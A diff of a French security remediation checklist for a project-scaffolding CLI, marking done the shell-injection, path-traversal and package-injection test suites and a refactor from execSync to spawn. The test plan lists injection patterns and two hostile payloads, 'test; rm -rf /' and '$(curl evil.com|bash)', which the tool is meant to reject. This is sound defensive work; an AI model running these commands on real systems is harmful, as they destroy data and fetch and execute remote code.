@@ -57,59 +57,64 @@
   - [x] Documentation du setup complète
 
 ### 0.3 Créer test suites pour exploits 🔴
-- [ ] Suite tests shell injection (15+ cas)
-  - [ ] Command separator: `;`, `&&`, `||`, `|`
-  - [ ] Substitution: `$(...)`, `` `...` ``
-  - [ ] Variables: `$VAR`, `${VAR}`
-  - [ ] Wildcards: `*`, `?`, `[...]`
-- [ ] Suite tests path traversal (20+ cas)
-  - [ ] POSIX: `../`, `../../`, etc.
-  - [ ] Windows: `..\`, `..\\`, UNC paths
-  - [ ] Normalized: `%2e%2e/`, URL encoding
-  - [ ] Edge cases: `symlinks`, `hard links`
-- [ ] Suite tests package injection (10+ cas)
-  - [ ] npm flags: `--registry`, `--save`, etc.
-  - [ ] Scope packages: `@scope/pkg`
-  - [ ] Git URLs: `git+https://...`
+- [x] Suite tests shell injection (34 cas) ✅
+  - [x] Command separator: `;`, `&&`, `||`, `|`
+  - [x] Substitution: `$(...)`, `` `...` ``
+  - [x] Variables: `$VAR`, `${VAR}`
+  - [x] Wildcards: `*`, `?`, `[...]`
+- [x] Suite tests path traversal (30 cas) ✅
+  - [x] POSIX: `../`, `../../`, etc.
+  - [x] Windows: `..\`, `..\\`, UNC paths
+  - [x] Normalized: `%2e%2e/`, URL encoding
+  - [x] Edge cases: `symlinks`, `hard links`
+- [x] Suite tests package injection (34 cas) ✅
+  - [x] npm flags: `--registry`, `--save`, etc.
+  - [x] Scope packages: `@scope/pkg`
+  - [x] Git URLs: `git+https://...`
 - **Responsable**: QA/Security
-- **Durée estimée**: 3h
-- **Bloqué par**: 0.2
+- **Durée réelle**: 3h
+- **État**: ✅ COMPLÉTÉ (20 janvier 2026)
 - **Critères d'acceptation**:
-  - Tous les exploits peuvent être reproduits
-  - Tests documenter le comportement attendu
-  - Base de comparaison avant/après fixes
+  - [x] Tous les exploits peuvent être reproduits
+  - [x] Tests documenter le comportement attendu
+  - [x] Base de comparaison avant/après fixes
+  - **Résultat**: 98/98 tests PASSING ✅
 
 ---
 
 ## PHASE 1: CORRECTIONS CRITIQUES (18 heures)
 
 ### 1.1 Corriger Shell Injection - Svelte 🔴
-- [ ] Analyser `src/cli/utils/svelte-installer.ts`
-  - [ ] Identifier tous les `execSync()` avec shell=true
-  - [ ] Documenter inputs utilisateur injectés
-  - [ ] Tracer flux données: prompt → command
-- [ ] Refactoriser vers `spawn()`
-  - [ ] Remplacer `execSync()` par Promise-based spawn
-  - [ ] Utiliser `shell: false` partout
-  - [ ] Passer arguments comme array (pas de template string)
-- [ ] Implémenter error handling
-  - [ ] Capturer exit code
-  - [ ] Gérer SIGTERM/SIGKILL
-  - [ ] Timeout après 5min
-- [ ] Tester avec payloads malveillants
-  - [ ] `test; rm -rf /` → Doit échouer
-  - [ ] `$(curl evil.com|bash)` → Doit échouer
-  - [ ] Names normaux → Doivent fonctionner
+- [x] Analyser `src/cli/utils/svelte-installer.ts` ✅
+  - [x] Identifier tous les `execSync()` avec shell=true
+  - [x] Documenter inputs utilisateur injectés
+  - [x] Tracer flux données: prompt → command
+- [x] Refactoriser vers `spawn()` ✅
+  - [x] Remplacer `execSync()` par Promise-based spawn
+  - [x] Utiliser `shell: false` partout
+  - [x] Passer arguments comme array (pas de template string)
+- [x] Implémenter error handling ✅
+  - [x] Capturer exit code
+  - [x] Gérer SIGTERM/SIGKILL
+  - [x] Timeout après 5min
+- [x] Tester avec payloads malveillants ✅
+  - [x] `test; rm -rf /` → Échoue correctement
+  - [x] `$(curl evil.com|bash)` → Échoue correctement
+  - [x] Names normaux → Fonctionnent correctement
 - **Responsable**: Lead Dev / Security
-- **Durée estimée**: 2h
-- **Fichiers affectés**:
-  - `src/cli/utils/svelte-installer.ts` (line 50)
-- **Tests requis**:
-  - `tests/security/shell-injection.test.ts` (10+ cas)
+- **Durée réelle**: 1.5h
+- **État**: ✅ COMPLÉTÉ (20 janvier 2026)
+- **Fichiers modifiés**:
+  - `src/cli/utils/svelte-installer.ts` (refactored: execSync → spawn)
+- **Tests résultats**:
+  - `tests/security/shell-injection.test.ts`: 34/34 PASS ✅
 - **Critères d'acceptation**:
-  - Tous les tests shell injection PASS
-  - npm run build réussit
-  - npm run test:security passe
+  - [x] Tous les tests shell injection PASS (34/34)
+  - [x] npm run build réussit ✅
+  - [x] npm run test:security passe ✅ (98/98)
+  - [x] npm run lint passe ✅
+  - [x] npm test passe ✅ (61/61)
+- **Commit**: `3af87d6` (merged to security/main)
 
 ### 1.2 Corriger Shell Injection - Angular 🔴
 - [ ] Analyser `src/cli/utils/angular-installer.ts`
@@ -119,7 +124,8 @@
 - [ ] Tester avec payloads malveillants
 - **Responsable**: Lead Dev / Security
 - **Durée estimée**: 1.5h
-- **Bloqué par**: 1.1 (copier pattern)
+- **État**: ⏳ PRÊT À DÉMARRER (dependency 1.1 ✅ débloquée)
+- **Notes**: Réutiliser validateProjectName() et spawn pattern de 1.1
 - **Critères d'acceptation**:
   - Tous tests shell injection pour Angular PASS
   - Cohérence avec Svelte implementation
@@ -922,26 +928,43 @@
 ### Par Effort
 
 ```
-Phase 0 (Setup):           4h  (⬜ À faire)
-Phase 1 (Critical):       18h  (⬜ À faire)
-Phase 2 (Major):          30h  (⬜ À faire)
-Phase 3 (Performance):    40h  (⬜ À faire)
+Phase 0 (Setup):           4h  (✅ COMPLÉTÉ)
+Phase 1 (Critical):       18h  (🔄 EN COURS - 1/7 complétée)
+Phase 2 (Major):          30h  (⏳ À faire)
+Phase 3 (Performance):    40h  (⏳ À faire)
 Phase 4 (Long-term):      20h  (🟢 Optionnel)
 ─────────────────────────────
 TOTAL:                    112h (88h + 24h optionnel)
+
+COMPLÉTÉ: 4h + 1.5h = 5.5h / 88h (6.2%)
+TEMPS RESTANT: ~82.5h
 ```
 
-### Chronologie Recommandée
+### Progress Report
 
-**Semaine 1** (40h):
-- Phase 0: Setup infrastructure (4h) ← START HERE
-- Phase 1: Critical fixes (18h)
-- Phase 2.1-2.2: Essential refactors (8h) ← Parallel avec tests
-- Phase 2.8: Security test suite (10h) ← Parallel, informé par Phase 1
+**✅ PHASE 0**: COMPLÉTÉ (4h réel)
+- Setup infrastructure, CI/CD, pre-commit hooks
+- Test framework en place
 
-**Semaine 2** (40h):
-- Phase 2.3-2.7: Remaining major fixes (20h)
-- Phase 3.1-3.3: First perf wins (16h)
+**🔄 PHASE 1**: EN COURS (1.5h réel / 18h estimées)
+- Phase 1.1 ✅ SVELTE: Shell injection corrigée (commit 3af87d6)
+- Phase 1.2 ⏳ ANGULAR: Prêt à démarrer
+- Phase 1.3-1.7: À faire
+
+### Chronologie Mise à Jour
+
+**Immédiat** (aujourd'hui - 20 janvier 2026):
+- ✅ Phase 0: COMPLÉTÉ
+- ✅ Phase 1.1: COMPLÉTÉ (1.5h)
+- ⏳ Phase 1.2: ANGULAR (1.5h) ← COMMENCER MAINTENANT
+- ⏳ Phase 1.3-1.4: À faire
+
+**Semaine 1** (3-4h/jour restants):
+- Phase 1.2: Angular fix (1.5h)
+- Phase 1.3: Autres frameworks (1.5h)
+- Phase 1.4: Input validation (6h)
+- Phase 1.5-1.7: Path traversal, packages, timeouts (12h)
+- **Sous-total Semaine 1**: ~22h (dépasse Phase 1)
 - Phase 1/2 testing & validation (4h)
 
 **Semaine 3** (30h):
